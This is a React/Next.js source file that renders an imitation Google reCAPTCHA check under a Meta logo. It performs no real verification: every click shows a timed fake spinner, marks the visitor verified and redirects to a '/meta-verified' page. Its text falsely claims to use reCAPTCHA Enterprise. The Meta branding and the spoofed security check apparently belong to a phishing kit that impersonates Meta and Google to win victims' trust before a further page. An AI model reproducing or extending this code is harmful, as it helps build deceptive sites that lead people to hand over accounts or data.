'use client'

import React from 'react'
import { useRouter } from 'next/navigation'

/** reCAPTCHA UI luôn hiển thị tiếng Anh, không phụ thuộc locale app */
const RECAPTCHA_EN = {
    notRobot: "I'm not a robot",
    privacyTerms: 'Privacy - Terms',
    p1:
        'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
    p2:
        "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
    p3:
        'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
} as const

const VERIFY_DELAY_MS = { min: 1400, max: 2200 }
const NAVIGATE_DELAY_MS = 650

const ReCaptcha = () => {
    const [isPressed, setIsPressed] = React.useState(false)
    const [isLoading, setIsLoading] = React.useState(false)
    const [isVerified, setIsVerified] = React.useState(false)
    const router = useRouter()
    const verifyTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
    const navigateTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)
    const pressTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)

    React.useEffect(() => {
        return () => {
            if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
            if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
            if (pressTimerRef.current) clearTimeout(pressTimerRef.current)
        }
    }, [])

    const startVerification = () => {
        setIsLoading(true)

        const delay =
            VERIFY_DELAY_MS.min +
            Math.floor(Math.random() * (VERIFY_DELAY_MS.max - VERIFY_DELAY_MS.min))

        verifyTimerRef.current = setTimeout(() => {
            verifyTimerRef.current = null
            setIsLoading(false)
            setIsVerified(true)

            navigateTimerRef.current = setTimeout(() => {
                navigateTimerRef.current = null
                router.push('/meta-verified')
            }, NAVIGATE_DELAY_MS)
        }, delay)
    }

    const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (!e.target.checked || isLoading || isVerified || isPressed) return

        if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
        if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
        if (pressTimerRef.current) clearTimeout(pressTimerRef.current)

        setIsPressed(true)
        pressTimerRef.current = setTimeout(() => {
            pressTimerRef.current = null
            setIsPressed(false)
            startVerification()
        }, 120)
    }

    const checkboxStateClass = [
        isPressed ? 'is-pressed' : '',
        isLoading ? 'is-loading' : '',
        isVerified ? 'is-verified' : '',
    ]
        .filter(Boolean)
        .join(' ')

    const isInteractive = !isLoading && !isVerified

    return (
        <div
            lang="en"
            translate="no"
            className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto"
        >
            <div className="font-roboto text-[14px] text-gray-800 w-full max-w-[325px] flex flex-col justify-start px-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pb-[max(1.5rem,env(safe-area-inset-bottom))] pt-[max(1.5rem,env(safe-area-inset-top))] sm:h-screen sm:justify-center sm:py-0 md:px-0">
                <div className="w-full">
                    <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
                </div>

                <div className="flex w-full items-center justify-start py-5 font-roboto">
                    <div className="recaptcha-widget">
                        <div className="recaptcha-widget-main">
                            <div
                                className="recaptcha-checkbox-wrap"
                                style={{ WebkitTapHighlightColor: 'transparent' }}
                            >
                                <label
                                    className={`recaptcha-check ${isLoading ? 'cursor-wait' : isInteractive ? 'cursor-pointer' : 'cursor-default'}`}
                                    htmlFor="checked-captcha"
                                >
                                    <input
                                        type="checkbox"
                                        checked={isVerified}
                                        id="checked-captcha"
                                        onChange={handleCheckboxChange}
                                        aria-label={RECAPTCHA_EN.notRobot}
                                        disabled={!isInteractive}
                                        className="sr-only"
                                    />
                                    <span
                                        aria-hidden="true"
                                        className={`recaptcha-icon ${checkboxStateClass}`}
                                    >
                                        {isLoading && (
                                            <svg viewBox="0 0 24 24" className="recaptcha-spinner-svg">
                                                <circle className="recaptcha-spinner-bg" cx="12" cy="12" r="9.5" />
                                                <circle className="recaptcha-spinner-arc" cx="12" cy="12" r="9.5" />
                                            </svg>
                                        )}
                                        {isVerified && (
                                            <svg viewBox="0 0 24 24" className="recaptcha-checkmark">
                                                <path d="M6.5 12.2l3.1 3.1 8.2-8.4" />
                                            </svg>
                                        )}
                                    </span>
                                </label>
                            </div>
                            <label
                                htmlFor="checked-captcha"
                                className={`recaptcha-label ${isInteractive ? 'cursor-pointer' : 'cursor-default'}`}
                            >
                                {RECAPTCHA_EN.notRobot}
                            </label>
                        </div>
                        <div className="recaptcha-brand">
                            <img
                                src="/images/meta/recaptcha.png"
                                alt="reCAPTCHA"
                                className="recaptcha-badge-image"
                            />
                            <span className="recaptcha-brand-title">reCAPTCHA</span>
                            <span className="recaptcha-brand-links">{RECAPTCHA_EN.privacyTerms}</span>
                        </div>
                    </div>
                </div>

                <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
                    <p className="font-normal">{RECAPTCHA_EN.p1}</p>
                    <p className="font-normal mt-4">{RECAPTCHA_EN.p2}</p>
                    <p className="font-normal mt-4">{RECAPTCHA_EN.p3}</p>
                </div>
            </div>
        </div>
    )
}

export default ReCaptcha